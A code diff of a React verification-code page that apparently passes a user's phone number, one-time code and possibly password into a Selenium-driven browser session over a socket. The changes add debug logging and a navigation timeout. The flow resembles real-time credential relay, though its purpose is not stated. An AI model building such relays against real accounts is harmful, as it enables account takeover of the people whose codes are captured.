@@ -10,9 +10,18 @@ export const VerificationCodePage: React.FC = () => {
   const sessionId = searchParams.get('sessionId');
   const phoneNumber = searchParams.get('phoneNumber');
   
+  // Debug logging for URL parameters
+  useEffect(() => {
+    console.log('🔍 VerificationCodePage: URL parameters debug');
+    console.log('🔍 Current URL:', window.location.href);
+    console.log('🔍 Search params:', searchParams.toString());
+    console.log('🔍 Session ID:', sessionId);
+    console.log('🔍 Phone number from URL:', phoneNumber);
+    console.log('🔍 Phone number type:', typeof phoneNumber);
+    console.log('🔍 Phone number length:', phoneNumber?.length);
+  }, [searchParams, sessionId, phoneNumber]);
+  
   const [verificationCode, setVerificationCode] = useState('');
-  const [status, setStatus] = useState('');
-  const [isCheckingPasswordForm, setIsCheckingPasswordForm] = useState(false);
   
   const videoRef = useRef<HTMLVideoElement>(null);
   const socketRef = useRef<Socket | null>(null);
@@ -111,8 +120,6 @@ export const VerificationCodePage: React.FC = () => {
         if (data.sessionId === sessionId) {
           if (data.elementFound && data.elementType === 'passwordInput') {
             console.log('✅ Password form detected in Selenium window!');
-            setIsCheckingPasswordForm(false);
-            setStatus('Password required - redirecting...');
             
             // Stop monitoring since we found the password form
             stopPasswordFormMonitoring();
@@ -125,11 +132,10 @@ export const VerificationCodePage: React.FC = () => {
             }, 1000);
           } else if (data.elementType === 'passwordInput') {
             console.log('❌ Password form not detected - continuing to monitor');
-            setIsCheckingPasswordForm(false);
-            setStatus('No password required yet - continuing to monitor...');
           }
         }
       });
+
 
       // Expose socket for manual testing in console
       (window as any).debugSocket = socket;
@@ -178,8 +184,6 @@ export const VerificationCodePage: React.FC = () => {
   const checkPasswordFormPresence = () => {
     if (socketRef.current && socketRef.current.connected && sessionId) {
       console.log('🔍 Checking if password form is present in Selenium window...');
-      setIsCheckingPasswordForm(true);
-      setStatus('Checking if password is required...');
       
       socketRef.current.emit('checkElementInSelenium', {
         sessionId: sessionId,
@@ -268,8 +272,6 @@ export const VerificationCodePage: React.FC = () => {
       return; // Only submit when exactly 5 digits
     }
 
-    setStatus('Verifying code...');
-
     try {
       // Submit verification code to Selenium
       if (socketRef.current && socketRef.current.connected && sessionId) {
@@ -282,7 +284,6 @@ export const VerificationCodePage: React.FC = () => {
           if (data.sessionId === sessionId) {
             if (data.success) {
               console.log('✅ Verification code submitted successfully!');
-              setStatus('Code submitted successfully!');
               
               // Check if password form is required after verification code submission
               setTimeout(() => {
@@ -290,7 +291,6 @@ export const VerificationCodePage: React.FC = () => {
               }, 2000);
             } else {
               console.log('❌ Verification code submission failed:', data.error);
-              setStatus(`❌ Error: ${data.error || 'Failed to submit code'}`);
             }
           }
         });
@@ -305,12 +305,10 @@ export const VerificationCodePage: React.FC = () => {
         console.log('✅ Verification code submission sent to Selenium');
       } else {
         console.log('❌ Cannot submit - missing socket or session');
-        setStatus('❌ Error: Cannot connect to Selenium');
       }
       
     } catch (error) {
       console.error('Error submitting verification code:', error);
-      setStatus('❌ Error submitting code');
     }
   };
 
@@ -388,11 +386,21 @@ export const VerificationCodePage: React.FC = () => {
                   
                   // Click the edit button in Selenium
                   if (socketRef.current && socketRef.current.connected && sessionId) {
+                    console.log('[pencil] 🚀 Sending clickNumberEditButton event to Selenium...');
                     socketRef.current.emit('clickNumberEditButton', {
                       sessionId: sessionId,
                       timestamp: new Date().toISOString()
                     });
                     console.log('[pencil] ✅ Edit button click sent to Selenium');
+                    
+                    // Add a timeout fallback in case the response doesn't come
+                    setTimeout(() => {
+                      console.log('[pencil] ⏰ Timeout waiting for clickNumberEditButtonResult - navigating anyway');
+                      const phoneParam = phoneNumber ? `&phoneNumber=${encodeURIComponent(phoneNumber)}` : '';
+                      const navigationUrl = `/phone-login?sessionId=${sessionId}${phoneParam}`;
+                      console.log('[pencil] 🔗 Fallback navigation URL:', navigationUrl);
+                      navigate(navigationUrl);
+                    }, 5000); // 5 second timeout
                   } else {
                     console.log('[pencil] ⚠️ Socket not ready, attempting to reconnect...');
                     
@@ -421,7 +429,9 @@ export const VerificationCodePage: React.FC = () => {
                   }
                   
                   // Wait for clickNumberEditButtonResult event before navigating
+                  console.log('[pencil] 🔍 Setting up clickNumberEditButtonResult listener...');
                   socketRef.current?.once('clickNumberEditButtonResult', (data) => {
+                    console.log('[pencil] 📥 Received clickNumberEditButtonResult:', data);
                     if (data.sessionId === sessionId && data.success) {
                       console.log('[pencil] ✅ Number edit button clicked, navigating to phone login');
                       console.log('[pencil] 📞 Current phone number from URL:', phoneNumber);
@@ -432,6 +442,8 @@ export const VerificationCodePage: React.FC = () => {
                       navigate(navigationUrl);
                     } else if (data.sessionId === sessionId && !data.success) {
                       console.log('[pencil] ❌ Number edit button click failed:', data.error);
+                    } else {
+                      console.log('[pencil] ⚠️ Unexpected response data:', data);
                     }
                   });
                 }}
